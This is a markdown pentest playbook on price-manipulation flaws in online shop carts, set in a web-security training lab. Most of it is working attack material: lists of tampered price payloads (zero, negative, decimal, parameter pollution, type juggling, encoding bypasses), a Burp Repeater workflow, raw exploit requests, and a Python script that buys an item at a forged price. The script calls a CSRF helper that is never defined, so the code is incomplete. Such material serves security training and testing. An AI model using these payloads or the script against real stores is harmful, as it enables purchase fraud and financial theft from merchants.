# Price Manipulation

## When this applies

- Client-supplied price parameter (`price`, `cost`, `amount`, `total`) appears in `POST /cart` or order-creation requests.
- Server uses the client value verbatim instead of looking up the price from the product database.
- Identified by `parameters` like `productId=1&quantity=1&price=133700` where `price` matches the displayed retail price.

## Technique

Modify the price parameter to a smaller, zero, negative, or type-confused value. The server fails to re-validate against canonical pricing.

## Steps

### Basic price modification payloads

```http
# Original request
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&price=133700

# Payload 1: Zero-cost attack
productId=1&quantity=1&price=0

# Payload 2: Minimal cost
productId=1&quantity=1&price=1

# Payload 3: Negative price (gain credit)
productId=1&quantity=1&price=-1000

# Payload 4: Decimal manipulation
productId=1&quantity=1&price=0.01
productId=1&quantity=1&price=.01
productId=1&quantity=1&price=1.337
```

### Advanced price payloads

```http
# Format variations
price=1&price=133700  (Parameter pollution)
price[]=1&price[]=133700  (Array injection)
price={"amount":1,"currency":"USD"}  (JSON injection)
price=1337.00&discount=100  (Discount manipulation)

# Type juggling (values)
price="1"  (String)
price=true  (Boolean)
price=null  (Null)
price=undefined  (Undefined)
price=NaN  (Not a Number)

# Type juggling (PHP switch bypass)
# When strict === guards a value but switch() uses loose ==:
# Send JSON boolean true to bypass === guard and match first non-empty case
# {"type": true}  — bypasses ($x === 'secrets') but matches case 'secrets' in switch
# Also try: 0 (matches "0" or empty string), null, [] (array)

# Encoding bypasses
price=%31  (URL encoded "1")
price=0x1  (Hex)
price=1e0  (Scientific notation)
```

### Burp workflow — 2 minutes

```plaintext
Step 1: Proxy Setup
Burp → Proxy → Intercept ON
Browser → Add item to cart

Step 2: Capture Request
Proxy → HTTP History → Find POST /cart
Right-click → Send to Repeater (Ctrl+R)

Step 3: Parameter Identification
Repeater → Identify price parameter
Example: productId=1&quantity=1&price=133700

Step 4: Exploitation
Change: price=133700 → price=1
Click: Send (Ctrl+Space)
Verify: Response 200 OK

Step 5: Verification
Browser → Refresh cart page
Check: Total shows $0.01
Complete: Checkout process
```

### Vulnerable request example

```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

productId=1&redir=PRODUCT&quantity=1&price=133700
```

### Exploited request

```http
POST /cart HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: session=aXPdmjKkH7G8jDs9Kf3L2
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

productId=1&redir=PRODUCT&quantity=1&price=1
```

Result:
- Item added at $0.01 instead of $1,337.00
- Server accepts client-supplied price without validation

### Python automation

```python
#!/usr/bin/env python3
import requests

BASE_URL = "https://lab-id.web-security-academy.net"
SESSION_COOKIE = "abc123xyz789"
PRODUCT_ID = 1
MODIFIED_PRICE = 1

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

def add_to_cart_with_price(product_id, price):
    url = f"{BASE_URL}/cart"
    data = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": 1,
        "price": price
    }
    response = session.post(url, data=data)
    return response

def checkout():
    url = f"{BASE_URL}/cart/checkout"
    data = {"csrf": get_csrf_token()}
    response = session.post(url, data=data)
    return response

print("[*] Adding item with modified price...")
response = add_to_cart_with_price(PRODUCT_ID, MODIFIED_PRICE)
if response.status_code == 200:
    print("[+] Item added successfully")
    print("[*] Proceeding to checkout...")
    checkout_response = checkout()
    if "order-confirmation" in checkout_response.url:
        print("[+] Purchase complete!")
    else:
        print("[-] Checkout failed")
else:
    print("[-] Failed to add item")
```

## Verifying success

- Cart total reflects the manipulated price (e.g., $0.01 instead of $1,337).
- Checkout completes without re-charging the canonical price.
- Order confirmation lists the item at the modified price.

## Common pitfalls

- Some apps validate `price` against a max-discount cap on the server — try negative prices to flip the comparison.
- HPP behavior depends on backend (PHP last, ASP.NET concatenation, Java first) — test all permutations.
- Some applications recompute the total on checkout — exploit only succeeds if checkout uses cart-stored price (not re-fetched from DB).

## Tools

- Burp Suite Repeater
- Burp Param Miner (parameter discovery)
- curl
- Python `requests`
